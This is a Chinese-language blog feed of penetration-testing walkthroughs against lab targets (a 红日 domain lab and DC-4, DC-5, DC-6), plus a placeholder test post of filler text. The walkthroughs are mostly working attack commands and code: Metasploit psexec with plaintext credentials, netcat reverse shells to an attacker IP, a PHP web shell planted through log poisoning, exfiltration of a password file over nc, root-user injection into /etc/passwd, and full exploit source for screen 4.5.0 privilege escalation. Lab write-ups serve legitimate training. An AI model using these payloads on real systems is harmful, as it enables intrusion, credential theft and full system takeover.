class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#在MSF的命令执行shell中添加路由</span><br><span class="line">#新建路由</span><br><span class="line">run post/multi/manage/auroute</span><br><span class="line">#查看路由</span><br><span class="line">run autoroute -p</span><br><span class="line">#挂起会话</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 4a</span><br><span class="line">set srvport 1080/9050</span><br><span class="line">run</span><br><span class="line">jobs     #执行之后后台会挂起一个jobs</span><br><span class="line"></span><br><span class="line">route add 10.10.10.0 255.255.255.0 session_id</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks4 127.0.0.1 1080</span><br><span class="line">socks4 127.0.0.1 9050</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1-20231118191657-dtpgte8.png" alt="添加路由">​<img src="/assets/MSF%E4%B8%AD%E4%BB%A3%E7%90%86%E6%A8%A1%E5%9D%97-20231118191702-l4ejo0e.png" alt="MSF中代理模块">​<img src="/assets/%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%90%86-20231118191707-m6gdxch.png" alt="执行代理">​![添加路由 (2)](assets&#x2F;添加路由 2-20231118191716-609obbq.png)​​​​</p><h3 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -sV 10.10.10.10</span><br><span class="line">proxychains nmap -sT -Pn -sV 10.10.10.201</span><br><span class="line">#发现域控和PC都开启了3389端口445端口</span><br><span class="line">#我们可以远程登录</span><br><span class="line">#也可以利用psexec</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F10%E5%9F%9F%E6%8E%A73389-20231118191809-2phpfdj.png" alt="挂代理扫描10域控3389">​</p><p>​<img src="/assets/%E8%AF%A5%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F201PC-20231118191817-zq2qwtp.png" alt="该代理扫描201PC">​</p><h3 id="利用psexec拿下域控"><a href="#利用psexec拿下域控" class="headerlink" title="利用psexec拿下域控"></a>利用psexec拿下域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exp/win/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.10</span><br><span class="line">set SMBuser de1ay</span><br><span class="line">set SMBpass 1qaz@WSX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PSEXEC%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E7%9A%84%E8%AE%BE%E7%BD%AE-20231118192157-qhoi8f3.png" alt="PSEXEC攻击域控的设置">​<img src="/assets/MSF+psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E6%88%90%E5%8A%9F-20231118192253-5b341cp.png" alt="MSF+psexec攻击域控成功">​<img src="/assets/%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7-20231118192326-rdmldif.png" alt="拿下域控">​​​</p><h3 id="3389拿下PC，域控"><a href="#3389拿下PC，域控" class="headerlink" title="3389拿下PC，域控"></a>3389拿下PC，域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">rdesktop 192.168.43.80:3389         #成功</span><br><span class="line">rdesktop 192.168.43.201:3389        #失败</span><br><span class="line">rdesktop 10.10.10.10:3389           #失败</span><br><span class="line">#可以把80当作跳板机，远程登录PC和域控</span><br><span class="line">#CMD远程登录</span><br><span class="line">mstsc /v:10.10.10.10 /f</span><br><span class="line">mstsc /v:10.10.10.201 /f</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-15 123823](assets&#x2F;屏幕截图 2023-11-15 123823-20231118192537-2i1yq92.png)​![屏幕截图 2023-11-15 163906](assets&#x2F;屏幕截图 2023-11-15 163906-20231118192542-xf8n3qz.png)​​</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试3</title>
      <link href="/2024/04/11/test3/"/>
      <url>/2024/04/11/test3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>##代码相关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Your code here</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        showNotification() &#123;</span><br><span class="line">            this.$notify(&#123;</span><br><span class="line">                title: &quot;你已被发现😜&quot;,</span><br><span class="line">                message: &quot;小伙子，扒源记住要遵循GPL协议！&quot;,</span><br><span class="line">                position: &#x27;top-left&#x27;,</span><br><span class="line">                offset: 50,</span><br><span class="line">                showClose: true,</span><br><span class="line">                type: &quot;warning&quot;,</span><br><span class="line">                duration: 5000</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>​<code>javascript console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); ​</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdsafkdsajklfadsghasgsajghsad;g</span><br><span class="line">ksalghasdfg</span><br><span class="line">g</span><br><span class="line">asdfgadsgsa</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-4</title>
      <link href="/2024/04/11/DC/DC-4/"/>
      <url>/2024/04/11/DC/DC-4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h3 id="主机发现—扫描客户端存活主机：-sP"><a href="#主机发现—扫描客户端存活主机：-sP" class="headerlink" title="#主机发现—扫描客户端存活主机：-sP"></a>#主机发现—扫描客户端存活主机：-sP</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.43.0/24</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><h3 id="端口探测，服务识别—探测端口版本：-sV"><a href="#端口探测，服务识别—探测端口版本：-sV" class="headerlink" title="#端口探测，服务识别—探测端口版本： -sV"></a>#端口探测，服务识别—探测端口版本： -sV</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.43.7</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-20231014160755-9rns89n.png" alt="DC4端口探测">22，80</p><p>‍</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="#指纹识别"></a>#指纹识别</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.7/</span><br></pre></td></tr></table></figure><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="#目录扫描"></a>#目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.7/ -e php -i</span><br></pre></td></tr></table></figure><p>​<img src="/assets/dc4%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-20231014160547-xq6cgfp.png" alt="dc4目录扫描">没什么用</p><h3 id="Hydra爆破–字典为john–没啥用"><a href="#Hydra爆破–字典为john–没啥用" class="headerlink" title="#Hydra爆破–字典为john–没啥用"></a>#Hydra爆破–字典为john–没啥用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/john/password.lst 192.168.43.7 http-get /</span><br></pre></td></tr></table></figure><h3 id="BP抓包爆破-登录界面可以RCE"><a href="#BP抓包爆破-登录界面可以RCE" class="headerlink" title="#BP抓包爆破-登录界面可以RCE"></a>#BP抓包爆破-登录界面可以RCE</h3><p>​<img src="/assets/DC4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231014165551-2xmf2qb.png" alt="DC4命令执行">whoami:www-data  —低权限</p><h3 id="kali机反弹shell"><a href="#kali机反弹shell" class="headerlink" title="#kali机反弹shell"></a>#kali机反弹shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">BP：nc+-e+/bin/bash+192.168.43.33+8888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4%E5%8F%8D%E5%BC%B9shell-20231014165955-18uv8db.png" alt="DC4反弹shell">空格 &#x3D; +</p><h3 id="低权限交互式shell"><a href="#低权限交互式shell" class="headerlink" title="#低权限交互式shell"></a>#低权限交互式shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="#尝试提权"></a>#尝试提权</h3><p>&#x2F;home&#x2F;jim</p><p>存在三个东西 mbox无权限访问</p><p>‍</p><p>SUID提权:无果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">find:   这是Linux系统中用于查找文件和目录的命令。</span><br><span class="line">/:           这是find命令的起始路径，从根目录开始进行搜索</span><br><span class="line">-user root:  find命令的一个条件，表示要查找属主为</span><br><span class="line">root的文件。</span><br><span class="line">-perm -4000: find命令的另一个条件，表示要查找具有SUID权限（权限设置为4xxx）的文件。</span><br><span class="line">-print:      find命令的一个动作，表示将符合条件的文件路径输出到标准输出（stdout）</span><br><span class="line">2\&gt;/dev/null: 这是将错误输出（stderr）重定向到/dev/null，即将错误信息丢弃，不显示在终端上。</span><br><span class="line">-type f：     文件类型为f</span><br><span class="line">-exec ls -ldb &#123;&#125;\;  这是 -exec 选项的一部分，用于标记命令的结束。</span><br></pre></td></tr></table></figure><p>&#x2F;home&#x2F;jim 存在old-passwords.bak文件 保存至本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp /home/jim/backups/old-passwords.bak 192.168.43.33:/home/kali   -----权限不够</span><br><span class="line"></span><br><span class="line">把old-passwords.bak传出来   ----利用nc</span><br><span class="line">kali</span><br><span class="line">nc -lvnp 2334 &gt; old-passwords.txt</span><br><span class="line">靶机</span><br><span class="line">nc 192.168.43.33 2334 &lt; jim/backups/old-passwords.bak</span><br></pre></td></tr></table></figure><h3 id="ssh爆破登录jim"><a href="#ssh爆破登录jim" class="headerlink" title="#ssh爆破登录jim"></a>#ssh爆破登录jim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P /home/kali/old-passwords.txt 192.168.43.7 ssh -vV</span><br><span class="line"></span><br><span class="line">得到密码：jibril04</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4ssh%E7%88%86%E7%A0%B4-20231014174628-dt6fqbe.png" alt="DC4ssh爆破">​</p><h3 id="​​ssh登录jim​"><a href="#​​ssh登录jim​" class="headerlink" title="​​ssh登录jim​"></a>​​ssh登录jim​</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.43.7</span><br><span class="line"></span><br><span class="line">查看mbox</span><br><span class="line">cat mbox    ---一封text邮箱</span><br><span class="line">cat /var/mail   --------得到charles的密码:^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">#登录charles</span><br><span class="line">su charles</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">切换用户，sudo -l发现提示：teehee命令可无密码以root权限执行</span><br><span class="line">sudo -l</span><br><span class="line">-Matching Defaults entries for charles on dc-4:</span><br><span class="line">-    env\_reset, mail\_badpass,</span><br><span class="line">-    secure\_path\=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">-User charles may run the following commands on dc-4:</span><br><span class="line">-    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">echo &quot;test1::0:0:root:/root:/bin/bash&quot;|sudo teehee -a /etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4jim-20231014174928-ysbsd0z.png" alt="DC4jim">you have mail  ——–！</p><p>​![屏幕截图 2023-10-14 175249](assets&#x2F;屏幕截图 2023-10-14 175249-20231014175257-iai8fdl.png)​</p><p>​![屏幕截图 2023-10-14 175655](assets&#x2F;屏幕截图 2023-10-14 175655-20231014175702-i898vay.png)​</p><h3 id="提权"><a href="#提权" class="headerlink" title="#提权"></a>#提权</h3><p>​![屏幕截图 2023-10-14 180532](assets&#x2F;屏幕截图 2023-10-14 180532-20231014180627-uzpewua.png)</p><h3 id="​​拿下​"><a href="#​​拿下​" class="headerlink" title="​​拿下​"></a>​​拿下​</h3><p>​![屏幕截图 2023-10-14 180539](assets&#x2F;屏幕截图 2023-10-14 180539-20231014180642-f59cxs9.png)​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-5</title>
      <link href="/2024/04/11/DC/DC-5/"/>
      <url>/2024/04/11/DC/DC-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>#主机探测</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB-20231015155023-akgdcf8.png" alt="D主机存活">​</p><p>#端口扫描</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -sS -T4 -v 192.168.43.8</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dduank%E6%89%AB%E6%8F%8F-20231015155207-dkax237.png" alt="Dduank扫描">80.111</p><p>#目录爆破</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.8 -e php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-20231015155050-jgo8qu1.png" alt="D目录扫描">​</p><p>#Web界面</p><p>啥苟八拉丁语没啥用</p><p>组件：php+nginx1.6.2</p><p>读取nginx配置文件信息，发现nginx日志记录文件路径<br>Nginx配置文件路径： &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>Nginx日志文件所在目录：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log    &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>存在文件包含漏洞</p><p>​<img src="/assets/D80%E7%AB%AF%E5%8F%A3-20231015155315-k3w86h6.png" alt="D80端口">​</p><p>#BP抓包-分析</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /thinkyou.php?file=/etc/passwd HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /thinkyou.php?file=<span class="meta">&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DGET-20231015105915-v2vvb1v.png" alt="DGET"></p><p>​![屏幕截图 2023-10-15 155415](assets&#x2F;屏幕截图 2023-10-15 155415-20231015155420-clfsa37.png)​</p><p>​<img src="/assets/Dnginx%E6%97%A5%E5%BF%97D-20231015155349-vpodfwy.png" alt="Dnginx日志D">​</p><p>​</p><p>#反弹shell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali：</span><br><span class="line">nc -lvvp 8888</span><br><span class="line"></span><br><span class="line">BP:</span><br><span class="line">GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.43.33 8888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dkalinc-20231015155446-nbqtr09.png" alt="Dkalinc"></p><p>​​<img src="/assets/DbpNC-20231015155607-3uibeoi.png" alt="DbpNC">​</p><p>#低权限交互式shell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>#提权</p><p>尝试SUID</p><p>suid提权：Nmap 、Vim、 find、 Bash、 More 、Less、 Nano 、cp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;\;</span><br><span class="line"></span><br><span class="line">存在screen 4.5.0</span><br><span class="line">searchsploit screen 4.5.0</span><br><span class="line"></span><br><span class="line">cat 41154.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dscreen-20231015155620-29nbx9j.png" alt="Dscreen"></p><p>‍</p><p>#kali本地编辑</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">创建libhax.c文件</span><br><span class="line">#include <span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include \&lt;unistd.h\&gt;</span><br><span class="line">attribute ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">编译libhax.c文件为libhax.so</span><br><span class="line"></span><br><span class="line">新建rootshell.c</span><br><span class="line">#include <span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">编译rootshell.c文件为rootshell</span><br><span class="line"></span><br><span class="line">创建dc5.sh文件</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshel</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/D51154-20231015155658-xrmtu02.png" alt="D51154">​</p><p>#上传到靶机tmp下 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -nlvp 2333 &lt; libhax.so</span><br><span class="line">nc -nlvp 2333 &lt; rootshell</span><br><span class="line">nc -nlvp 2333 &lt; dc5.sh</span><br><span class="line">目标机：</span><br><span class="line">nc 192.168.43.33 2333 &gt; libhax.so</span><br><span class="line">nc 192.168.43.33 2333 &gt; rootshell</span><br><span class="line">nc 192.168.43.33 2333 &gt; dc5.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D-3nc-20231015155802-5rpx64i.png" alt="D-3nc">​</p><p>#运行dc5.sh </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod +x dc5.sh</span><br><span class="line">./dc5.sh</span><br></pre></td></tr></table></figure><p>#FLAG </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-6</title>
      <link href="/2024/04/11/DC/DC-6/"/>
      <url>/2024/04/11/DC/DC-6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>#主机探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Darp-scan-20231016164829-5z8wr5m.png" alt="Darp-scan">​</p><p>‍</p><p>#端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -T4 -sS -sV 192.168.43.9</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dnmap-20231016164837-bqhvan4.png" alt="Dnmap">​</p><p>#目录爆破 ​​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://wordy </span><br></pre></td></tr></table></figure><p>​<img src="/assets/Ddirsearch-20231016164853-anemsx4.png" alt="Ddirsearch">​</p><p>#指纹识​​别 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.9</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dwhatweb-20231016164910-9sma5wr.png" alt="Dwhatweb">​</p><p>#web登录界面</p><p>‍</p><p>#wpscan爆破账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.43.9 -e u</span><br><span class="line">wpscan --url http://192.168.43.9 -U user.txt -P passwords.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dwpsacn-U-P-20231016164923-hp8lfsv.png" alt="Dwpsacn-U-P">​</p><p>#WordPress插件存在RCE</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ls</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dac%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231016164958-8rlxfdb.png" alt="Dac插件命令执行">​</p><p>#反弹shell </p><p>网站存在输入限制，BP抓包改</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">BP:</span><br><span class="line">nc -e /bin/bash 192.168.43.33 8888</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>​<img 